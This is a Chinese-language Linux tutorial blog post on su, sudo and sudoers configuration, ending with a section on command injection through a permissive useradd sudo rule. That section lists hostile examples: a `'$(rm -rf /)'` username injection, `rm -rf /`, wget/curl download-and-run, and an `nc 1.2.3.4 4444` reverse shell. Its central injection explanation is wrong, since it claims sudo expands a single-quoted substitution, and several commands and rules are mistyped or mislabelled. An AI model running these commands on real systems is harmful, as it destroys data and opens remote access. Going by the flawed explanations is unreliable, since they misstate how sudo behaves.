<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="提权"><meta name="keywords" content="Linux"><meta name="author" content="wickt42"><meta name="copyright" content="wickt42"><title>提权 | Wickt42's Tech Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '7.3.0'
} </script><meta name="generator" content="Hexo 7.3.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.1.</span> <span class="toc-text">命令示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7"><span class="toc-number">1.1.1.</span> <span class="toc-text">切换用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%8D%95%E6%9D%A1%E5%91%BD%E4%BB%A4%E5%90%8E%E9%80%80%E5%87%BA"><span class="toc-number">1.1.2.</span> <span class="toc-text">执行单条命令后退出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">注意</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%9C%BA%E6%99%AF%E5%BA%94%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">实际场景应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%BB%B4%E6%8A%A4%E4%B8%AD"><span class="toc-number">1.2.1.</span> <span class="toc-text">系统维护中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E5%A4%9A%E7%94%A8%E6%88%B7%E5%8D%8F%E4%BD%9C%E4%B8%AD"><span class="toc-number">1.2.2.</span> <span class="toc-text">在多用户协作中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E4%B8%B4%E6%97%B6%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.3.</span> <span class="toc-text">脚本临时提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">临时提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E4%B8%8Esu%E7%9B%B8%E6%AF%94"><span class="toc-number">2.1.</span> <span class="toc-text">sudo与su相比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E5%91%BD%E4%BB%A4%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">sudo命令的执行过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-etc-sudoers"><span class="toc-number">2.4.</span> <span class="toc-text">sudo的配置文件&#x2F;etc&#x2F;sudoers</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84"><span class="toc-number">2.4.1.</span> <span class="toc-text">基本结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%AF%AD%E6%B3%95"><span class="toc-number">2.4.2.</span> <span class="toc-text">配置语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.4.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">2.5.</span> <span class="toc-text">基本使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">2.6.</span> <span class="toc-text">在安全领域的应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F-1"><span class="toc-number">2.7.</span> <span class="toc-text">注意</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95"><span class="toc-number">2.7.1.</span> <span class="toc-text">解决办法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%AE%9E%E9%AA%8C"><span class="toc-number">3.</span> <span class="toc-text">命令实验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7test%E5%B9%B6%E6%B5%8B%E8%AF%95sudo%E6%9D%83%E9%99%90"><span class="toc-number">3.0.1.</span> <span class="toc-text">首先创建用户test并测试sudo权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86test%E7%94%A8%E6%88%B7%E5%8A%A0%E5%85%A5wheel%E7%BB%84"><span class="toc-number">3.0.2.</span> <span class="toc-text">将test用户加入wheel组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%BE%91-etc-sudoers%E6%96%87%E4%BB%B6"><span class="toc-number">3.0.3.</span> <span class="toc-text">编辑&#x2F;etc&#x2F;sudoers文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%89%B9%E6%AE%8A%E8%83%8C%E6%99%AF%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">在特殊背景下的命令注入攻击与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%B8%8E%E5%85%B7%E4%BD%93%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.1.</span> <span class="toc-text">攻击方式与具体注入命令示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%8A%A4%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">如何防护命令注入攻击</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729165900674.jpg"></div><div class="author-info__name text-center">wickt42</div><div class="author-info__description text-center">Information Security</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/wickt42/wickt42.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">21</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">5</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://github.com/">github</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody">hexo-theme-melody</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729164955479.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Wickt42's Tech Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/slides">Slides</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">提权</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2025-07-31</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Linux/">Linux</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Linux/%E6%8F%90%E6%9D%83/">提权</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><strong>su</strong>是 <strong>“Switch User”</strong> 或 <strong>“Substitute User”</strong> 的缩写，它的<strong>主要功能</strong>是允许一个已登录的用户切换到另一个用户的身份，并在新的 Shell 会话中以该用户的权限运行命令。当目标是切换到超级用户 (<code>root</code>) 时，这个过程就被称为 <strong>“提权”</strong>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su [选项] [用户名]</span><br><span class="line">su		<span class="comment"># 不加用户名默认为切换到root目录</span></span><br><span class="line">su -c		<span class="comment"># -c 命令是以目标用户身份执行单条命令后退出</span></span><br><span class="line">su -s		<span class="comment"># -s 指定shell如/bin/bash</span></span><br></pre></td></tr></table></figure>

<h3 id="命令示例"><a href="#命令示例" class="headerlink" title="命令示例"></a>命令示例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - root		<span class="comment"># 切换root用户并执行shell登录，将当前目录切换到目标用户的家目录，清除大多数环境变量就像目标用户自己登录一样，提供目标用户预期的完整、干净的环境。</span></span><br><span class="line">su root			<span class="comment"># 换到目标用户身份，但保持当前 Shell 的工作目录和环境变量不变（继承自调用者）</span></span><br><span class="line">su -			<span class="comment"># 同 su - root</span></span><br></pre></td></tr></table></figure>

<h4 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su enterprise		<span class="comment"># 不加 - ，注意观察路径</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250731184051670.png" alt="image-20250731184051592"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - enterprise</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250731184255057.png" alt="image-20250731184255017"></p>
<h4 id="执行单条命令后退出"><a href="#执行单条命令后退出" class="headerlink" title="执行单条命令后退出"></a>执行单条命令后退出</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - enterprise -c <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250731184535007.png" alt="image-20250731184534973"></p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>su需要输入目标用户的密码，若多人共用root密码，则难以审计操作来源，使用<code>sudo</code>·时间权限最小化和操作审计。</p>
<p>在安全要求高的场景，可以禁用root用户的su切换。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编辑 /etc/pam.d/su</span></span><br><span class="line">auth required pam_wheel.so use_uid</span><br><span class="line"><span class="comment"># 仅允许 wheel 组成员使用 su 命令</span></span><br></pre></td></tr></table></figure>

<p>切换用户后可以使用<code>exit</code>命令或是<code>ctrl + D</code>退回原用户</p>
<h3 id="实际场景应用"><a href="#实际场景应用" class="headerlink" title="实际场景应用"></a>实际场景应用</h3><h4 id="系统维护中"><a href="#系统维护中" class="headerlink" title="系统维护中"></a>系统维护中</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - root -c <span class="string">&quot;apt upgrate &amp;&amp; apt autoremove&quot;</span>	<span class="comment"># 以 root 用户身份更新系统</span></span><br></pre></td></tr></table></figure>

<h4 id="在多用户协作中"><a href="#在多用户协作中" class="headerlink" title="在多用户协作中"></a>在多用户协作中</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - user	<span class="comment"># 切换到开发人员user的账户调试环境</span></span><br></pre></td></tr></table></figure>

<h4 id="脚本临时提权"><a href="#脚本临时提权" class="headerlink" title="脚本临时提权"></a>脚本临时提权</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/bin/bash</span></span><br><span class="line"><span class="comment"># 以 root 身份创建目录</span></span><br><span class="line">su - root -c <span class="string">&quot;mkdir /opt/custom_app&quot;</span></span><br><span class="line"><span class="built_in">chown</span> user:user /opt/custom_app</span><br></pre></td></tr></table></figure>

<h2 id="临时提权"><a href="#临时提权" class="headerlink" title="临时提权"></a>临时提权</h2><p><strong>sudo</strong>是 <strong>“superuser do”</strong> 或 <strong>“substitute user do”</strong> 的缩写，它的核心功能是：<strong>允许一个已授权用户以另一个用户（通常是 <code>root</code>）的身份执行特定的命令，而无需知道目标用户的密码。</strong></p>
<h3 id="sudo与su相比"><a href="#sudo与su相比" class="headerlink" title="sudo与su相比"></a><code>sudo</code>与<code>su</code>相比</h3><ol>
<li><strong>无需共享 <code>root</code> 密码：</strong> 管理员无需告知任何人 <code>root</code> 密码，大大降低了密码泄露的风险。用户使用自己的密码进行提权。</li>
<li><strong>最小权限原则：</strong> 可以精确授予用户执行其工作所需的最少命令权限，而不是赋予完整的 <code>root</code> Shell 访问。例如，只允许用户重启 <code>apache</code> 服务，而不能做其他操作。</li>
<li><strong>详细的审计追踪：</strong> 所有 <code>sudo</code> 操作都会被记录（命令、参数、执行时间、用户、终端等），方便事后审查和故障排查。</li>
<li><strong>更高的安全性：</strong> 减少了意外执行破坏性命令的风险（因为每次都需要显式使用 <code>sudo</code>），并且限制了攻击者获取完整 <code>root</code> 访问的途径。</li>
<li><strong>更灵活的配置：</strong> 可以定义用户组、命令组、主机组，并设置复杂的规则（如环境变量、输入&#x2F;输出日志、超时等）。</li>
</ol>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> [选项] 命令</span><br></pre></td></tr></table></figure>

<p><strong>常用 <code>sudo</code> 选项：</strong></p>
<ul>
<li><strong><code>-l</code> 或 <code>--list</code>：</strong> 列出当前用户被允许执行的 <code>sudo</code> 命令。<strong>强烈建议在执行 <code>sudo</code> 前先使用此命令确认权限。</strong></li>
<li><strong><code>-v</code> 或 <code>--validate</code>：</strong> 刷新用户的 <code>sudo</code> 身份验证状态（延长密码缓存时间），而不执行任何命令。如果密码即将过期，会提示重新输入。</li>
<li><strong><code>-k</code> 或 <code>--reset-timestamp</code>：</strong> 立即终止用户的 <code>sudo</code> 身份验证状态（清除密码缓存），下次使用 <code>sudo</code> 需要重新输入密码。</li>
<li><strong><code>-u username</code> 或 <code>--user=username</code>：</strong> 以指定的用户身份执行命令（默认为 <code>root</code>）。例如 <code>sudo -u bob touch /tmp/bobfile.txt</code>。</li>
<li><strong><code>-s</code> 或 <code>--shell</code>：</strong> 启动目标用户（默认为 <code>root</code>）的 Shell（由 <code>SHELL</code> 环境变量或目标用户的默认 Shell 决定）。这是一个<strong>交互式 Shell</strong>，但环境变量可能部分继承当前用户（取决于配置和是否使用 <code>-H</code>）。</li>
<li><strong><code>-i</code> 或 <code>--login</code>：</strong> 模拟目标用户（默认为 <code>root</code>）的<strong>登录过程</strong>。类似 <code>su -</code>：<ul>
<li>切换到目标用户的家目录。</li>
<li>清除大多数环境变量。</li>
<li>加载目标用户的 Shell 配置文件 (<code>~/.profile</code>, <code>~/.bash_profile</code> 等)。</li>
<li>提供目标用户预期的完整环境。</li>
</ul>
</li>
<li><strong><code>-H</code> 或 <code>--set-home</code>：</strong> 将 <code>HOME</code> 环境变量设置为目标用户的家目录（通常在配合 <code>-s</code> 或 <code>-i</code> 时自动设置，单独执行命令时可能需要显式指定以确保命令使用正确的家目录）。</li>
<li><strong><code>-b</code> 或 <code>--background</code>：</strong> 在后台运行指定的命令。</li>
<li><strong><code>-E</code> 或 <code>--preserve-env</code>：</strong> 保留当前用户的环境变量传递给 <code>sudo</code> 执行的命令。<strong>注意：</strong> 管理员可以在 <code>/etc/sudoers</code> 中通过 <code>env_reset</code> 选项禁用此行为或使用 <code>env_keep</code> 指定保留的变量。使用此选项需要配置允许。</li>
</ul>
<h3 id="sudo命令的执行过程"><a href="#sudo命令的执行过程" class="headerlink" title="sudo命令的执行过程"></a><code>sudo</code>命令的执行过程</h3><p>1、系统读取<code>/etc/sudoers</code>文件，验证用户是否有权执行该命令</p>
<p>2、验证当前用户的密码</p>
<p>3、以目标身份执行命令，完成后权限自动回收</p>
<h3 id="sudo的配置文件-etc-sudoers"><a href="#sudo的配置文件-etc-sudoers" class="headerlink" title="sudo的配置文件/etc/sudoers"></a><code>sudo</code>的配置文件<code>/etc/sudoers</code></h3><p> 所有 <code>sudo</code> 的授权规则都定义在 <code>/etc/sudoers</code> 文件中。</p>
<p>只能使用编辑工具**<code>visudo</code>**，若使用<code>vim</code>等编辑器对<code>/etc/sudoers</code>文件进行编辑可能会造成语法错误，从而导致所有用户都无法使用<code>sudo</code>命令。</p>
<p>并且<code>visudo</code>在保存时会检查语法，如果检测到错误，它会警告你并拒绝保存损坏的配置，给你修复的机会。</p>
<h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><ul>
<li><strong>名定义 (<code>User_Alias</code>, <code>Host_Alias</code>, <code>Cmnd_Alias</code>, <code>Runas_Alias</code>)：</strong> 用于分组用户、主机、命令和目标用户，使规则更清晰和可管理。</li>
<li><strong>用户规范 (<code>User_Spec</code>)：</strong> 定义谁可以在哪里以谁的身份运行什么命令。这是核心配置部分。</li>
</ul>
<h4 id="配置语法"><a href="#配置语法" class="headerlink" title="配置语法"></a>配置语法</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">用户/组	主机=（可切换身份）	可执行的命令 [参数]</span><br></pre></td></tr></table></figure>

<p><strong>用户&#x2F;组：</strong><code>%</code>开头表示组</p>
<p>**主机：**ALL表示所有主机</p>
<p><strong>可切换身份</strong>：ALL表示任意用户，可指定为root</p>
<p>**命令：**需要使用绝对路径</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 允许 wheel 组成员以 root 身份执行所有命令</span></span><br><span class="line">%wheel ALL=(ALL) ALL</span><br><span class="line"><span class="comment"># 允许用户 user 无需密码重启 Apache</span></span><br><span class="line">user ALL=(root) NOPASSWD: /usr/bin/systemctl restart httpd</span><br><span class="line"><span class="comment"># 允许用户 user 在特定主机上管理用户</span></span><br><span class="line">user host01=(root) /usr/sbin.useradd, /usr/sbin/userdel</span><br></pre></td></tr></table></figure>

<p>使一个用户 userall 具有删除用户的权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方法一将userall用户加入wheel用户组</span></span><br><span class="line">usermod -aG wheel userall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二编辑/etc/sudoers文件为userall用户添加特权</span></span><br><span class="line">visudo</span><br><span class="line">添加 userall ALL=(root) /usr/sbin/userdel,/usr/sbin/useradd</span><br><span class="line">或者</span><br><span class="line">userall ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update		<span class="comment"># 更新软件包列表</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -u mysql /usr/bin/mysql_safe		<span class="comment"># 以mysql用户身份执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -i		<span class="comment"># 切换到 root 用户的完整环境</span></span><br><span class="line"><span class="built_in">sudo</span> -s		<span class="comment"># 启动 root 的 shell</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -l		<span class="comment"># 列出单签当前用户可执行的命令</span></span><br></pre></td></tr></table></figure>

<h3 id="在安全领域的应用"><a href="#在安全领域的应用" class="headerlink" title="在安全领域的应用"></a>在安全领域的应用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅允许用户管理服务</span></span><br><span class="line">user1 ALL=(root) /usr/bin/systemctl restart nginx, /usr/bin/systemctl status nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 超时配置，五分钟后需要重新输入密码</span></span><br><span class="line">user2 ALL=(root) NOPASSWD: /usr/bin/apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用root登录</span></span><br><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure>

<h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 允许 user 仅能添加用户（禁止删除）</span></span><br><span class="line">user5  ALL=(root)  /usr/sbin/useradd [A-Za-z]*</span><br></pre></td></tr></table></figure>

<p>这个模式匹配规则存在严重缺陷，<strong>无法有效防止命令注入或滥用</strong>，甚至可能带来意想不到的问题。</p>
<p>1、<strong>无法防止命令注入（最严重问题）：</strong></p>
<ul>
<li><code>sudo</code> 的命令参数匹配是基于<strong>模式匹配</strong>的，它<strong>不是</strong>在执行命令前对参数进行安全解析或转义。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># useradd 命令本身会解释它接收到的参数</span></span><br><span class="line"><span class="built_in">sudo</span> /usr/sbin/useradd <span class="string">&#x27;$(rm -rf /)&#x27;</span></span><br><span class="line"><span class="comment"># 当 useradd 尝试处理这个用户名时，Bash（或其他Shell）会先执行命令替换 $(rm -rf /)。结果是 useradd 会尝试创建一个名字是 rm -rf / 命令输出结果的用户，但在执行 useradd 之前，$(rm -rf /) 就已经被执行了。</span></span><br></pre></td></tr></table></figure>

<p>2、<strong>无法有效限制用户名：</strong></p>
<ul>
<li><code>user5</code> 可以轻松创建包含 <code>$</code>, <code>(</code>, <code>)</code>, &#96;&#96;, <code>-</code>, <code>/</code>, &#96;&#96;&#96;, <code>;</code>, <code>&amp;</code>, <code>|</code> 等特殊字符的用户名，只要这些字符被包裹在一个连续的字符串参数中。这可能导致：<ul>
<li>系统管理工具（如 <code>ls -l /home</code>）显示混乱。</li>
<li>脚本处理用户列表时出错。</li>
<li>更严重的安全隐患（如利用特殊字符绕过某些检查）。</li>
</ul>
</li>
<li>Linux 用户名<strong>允许</strong>包含字母、数字、下划线 <code>_</code>、连字符 <code>-</code> 和美元符号 <code>$</code>（通常不能以 <code>$</code> 开头）。完全禁止数字和 <code>_</code>、<code>-</code> 可能不符合实际需求。</li>
</ul>
<p>3、<strong>错误地阻止了必要的选项：</strong></p>
<ul>
<li>规则 <code>/usr/sbin/useradd [A-Za-z]*</code> <strong>不允许</strong>使用任何选项，因为选项前面有空格和 <code>-</code>。这导致 <code>user5</code> 只能运行最基本的 <code>sudo /usr/sbin/useradd username</code>。根据系统默认配置，这可能：<ul>
<li><strong>不创建主目录 (<code>/home/username</code>)</strong>： 用户无法登录或使用不便。</li>
<li>使用默认的 Shell (可能是 <code>/bin/sh</code> 或禁用的 <code>/usr/sbin/nologin</code>)。</li>
<li>使用默认的主组 (通常是 <code>users</code> 或 <code>nogroup</code>)，这可能不符合要求。</li>
</ul>
</li>
</ul>
<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><ul>
<li><p>尝试 <code>[a-zA-Z][a-zA-Z0-9_-]*</code> (要求首字符是字母，后面可以是字母、数字、下划线、连字符)。这<strong>仍然不能完全防止所有特殊字符注入</strong>（比如如果用户名里有单引号，攻击者可能构造闭合），但比 <code>[A-Za-z]*</code> 好很多。</p>
</li>
<li><p><strong>显式允许必要的安全选项：</strong> 将这些选项<strong>固定</strong>在命令中。<code>sudoers</code> 规则不支持“默认添加选项”，只能通过定义多个命令别名或规则来实现。</p>
</li>
</ul>
<h2 id="命令实验"><a href="#命令实验" class="headerlink" title="命令实验"></a>命令实验</h2><p>使一个用户 userall 具有删除用户的权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方法一将userall用户加入wheel用户组</span></span><br><span class="line">usermod -aG wheel userall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二编辑/etc/sudoers文件为userall用户添加特权</span></span><br><span class="line">visudo</span><br><span class="line">添加 userall ALL=(root) /usr/sbin/userdel,/usr/sbin/useradd</span><br><span class="line">或者</span><br><span class="line">userall ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<h4 id="首先创建用户test并测试sudo权限"><a href="#首先创建用户test并测试sudo权限" class="headerlink" title="首先创建用户test并测试sudo权限"></a>首先创建用户test并测试sudo权限</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@wickt 桌面]# useradd <span class="built_in">test</span></span><br><span class="line">[root@wickt 桌面]# passwd <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250731200713760.png" alt="image-20250731200713692"></p>
<h4 id="将test用户加入wheel组"><a href="#将test用户加入wheel组" class="headerlink" title="将test用户加入wheel组"></a>将test用户加入wheel组</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@wickt 桌面]# usermod -aG wheel <span class="built_in">test</span></span><br><span class="line">[root@wickt 桌面]# grep <span class="string">&quot;wheel&quot;</span> /etc/group</span><br><span class="line">wheel:x:10:<span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250731201217060.png" alt="image-20250731201217015"></p>
<h4 id="编辑-etc-sudoers文件"><a href="#编辑-etc-sudoers文件" class="headerlink" title="编辑/etc/sudoers文件"></a>编辑<code>/etc/sudoers</code>文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@wickt 桌面]# visudo</span><br><span class="line"><span class="comment"># 添加 test ALL=(ALL:ALL) ALL</span></span><br><span class="line">[root@wickt 桌面]# grep <span class="string">&quot;test&quot;</span> /etc/sudoers</span><br><span class="line"><span class="built_in">test</span> ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250731201530993.png" alt="image-20250731201530954"></p>
<h2 id="在特殊背景下的命令注入攻击与防御"><a href="#在特殊背景下的命令注入攻击与防御" class="headerlink" title="在特殊背景下的命令注入攻击与防御"></a>在特殊背景下的命令注入攻击与防御</h2><p><code>user5 ALL=(root) /usr/sbin/useradd</code>这条规则允许 <code>user5</code> 以 <code>root</code> 身份执行 <code>/usr/sbin/useradd</code> 命令。如果 <code>user5</code> 被攻击者控制（例如，通过一个 Web 表单或脚本间接接受用户输入来构造 <code>useradd</code> 命令的参数），并且这些输入没有经过严格的过滤和转义，攻击者就能尝试在参数中注入额外的命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m -rf /        	<span class="comment"># 删除文件</span></span><br><span class="line">wget / curl     <span class="comment">#下载并执行恶意脚本</span></span><br><span class="line"><span class="built_in">echo</span>            <span class="comment">#覆盖系统环境变量</span></span><br><span class="line">nc 1.2.3.4 4444		<span class="comment">#反向shell</span></span><br><span class="line">find / -<span class="built_in">exec</span> <span class="built_in">rm</span> -rf     <span class="comment"># 结合-exec执行恶意操作</span></span><br><span class="line">tar             <span class="comment"># 压缩覆盖系统文件</span></span><br><span class="line"><span class="built_in">chmod</span></span><br><span class="line"><span class="built_in">cat</span></span><br></pre></td></tr></table></figure>



